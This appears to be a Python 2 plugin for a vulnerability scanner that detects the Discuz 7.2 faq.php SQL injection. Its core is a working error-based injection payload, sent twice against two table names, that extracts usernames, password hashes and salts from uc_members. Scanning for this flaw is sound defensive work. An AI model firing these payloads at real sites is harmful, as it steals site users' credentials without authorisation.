# -*- coding: utf-8 -*-
'''
本插件针对 Discuz7 的 faq.php 文件 SQL注入漏洞
author: lidq
created: 20161214
'''

import traceback
# 导入SQL注入通用库，本插件是SQL注入基础插件，故写在通用库中
# 导入url请求公用库
from engine.engine_utils.InjectUrlLib import *
from engine.engine_utils.common import *
# 导入日志处理句柄
from engine.logger import scanLogger as logger
# 导入默认的header头
from engine.engine_utils.DictData import headerDictDefault


def run_domain(http, config):
    '''
    重写run_url函数，实现检测SQL注入的功能
    有异常时，直接输出异常
    无异常时，以list类型返回检测结果记录
    '''

    # 重新组织请求的参数
    scanInfo = {}
    scanInfo['siteId'] = config['siteId']
    scanInfo['ip'] = config['ip']
    scanInfo['scheme'] = config['scheme']
    scanInfo['domain'] = config['domain']
    scanInfo['level'] = config['level']
    scanInfo['vulId'] = config['vulId']
    headers = headerDictDefault
    headers['cookie'] = config['cookie']
    headers['Host'] = config['domain']
    source_ip = config.get('source_ip')
    responseList = []
    try:
        if source_ip:
            urlBase = scanInfo['scheme'] + "://" + source_ip
        else:
            urlBase = scanInfo['scheme'] + "://" + scanInfo['domain']
        url = urlBase + "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20concat%28username,0x3a,password,0x3a,salt%29%20from%20uc_members%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23"
        response = request(url=url, headers=headers)
        if response['httpcode'] == 200:
            if re.search('\w{32}:\w{6}', response['response_body']):
                injectInfo = returnInjectResult(url=url, confirm=1, detail="Discuz7.2 的 faq.php 文件存在SQL注入漏洞",
                                                response=response)
                responseList.append(getRecord2(scanInfo, injectInfo))

        url = urlBase + "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20concat%28username,0x3a,password,0x3a,salt%29%20from%20cdb_uc_members%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23"
        response = request(url=url, headers=headers)
        if response['httpcode'] == 200:
            if re.search('\w{32}:\w{6}', response['response_body']):
                injectInfo = returnInjectResult(url=url, confirm=1, detail="Discuz7.2 的 faq.php 文件存在SQL注入漏洞",
                                                response=response)
                responseList.append(getRecord2(scanInfo, injectInfo))
        if responseList:
            return responseList

    except Exception, e:
        logger.error("File:Discuz7_sql_faq_yd.py:" + str(e))
        traceback.print_exc()
    return responseList
